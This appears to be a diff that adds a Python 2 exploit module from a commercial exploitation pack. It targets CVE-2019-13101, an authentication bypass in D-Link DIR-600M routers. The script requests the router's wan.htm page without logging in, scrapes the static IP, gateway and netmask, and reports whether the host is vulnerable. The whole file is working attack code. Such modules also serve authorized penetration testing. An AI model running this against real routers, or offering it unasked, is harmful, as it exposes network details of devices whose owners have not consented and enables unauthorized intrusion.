@@ -1,0 +1,52 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2019
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_dlink_31'
+_vendor_ = 'dlink'
+_model_  = ['DIR-600M']
+_vuln_   = 'Access Bypass Vulnerability'
+_cve_    = 'CVE-2019-13101'
+_ref_    = 'https://packetstormsecurity.com/files/153994/D-Link-DIR-600M-master.zip'
+_port_   = 80
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = "http://%s:%s/wan.htm" % (host,port)
+    response = requests.get(url, verify=False)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+    
+  m = re.search('<input type="text" name="staip_ipaddr" size="15" maxlength="15" value=\\s*([\\d\\.]+)', response.text)
+  if m is None:
+    print '[+] %s not vulnerable' % host
+    print response.text
+  else:
+    print '[+] %s vulnerable' % host
+    ip = m.group(1)
+    gateway = ''
+    netmask = ''
+    m = re.search('<input type="text" name="staip_gateway" size="15" maxlength="15" value=\\s*([\\d\\.]+)', response.text)
+    if m is not None:
+      gateway = m.group(1)
+    m = re.search('<input type="text" name="staip_netmask" size="15" maxlength="15" value=\\s*([\\d\\.]+)', response.text)
+    if m is not None:
+      netmask = m.group(1)    
+    print('IP Address: %s\nSubnet Mask: %s\nDefault Gateway: %s\n'%(ip,netmask,gateway))            
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
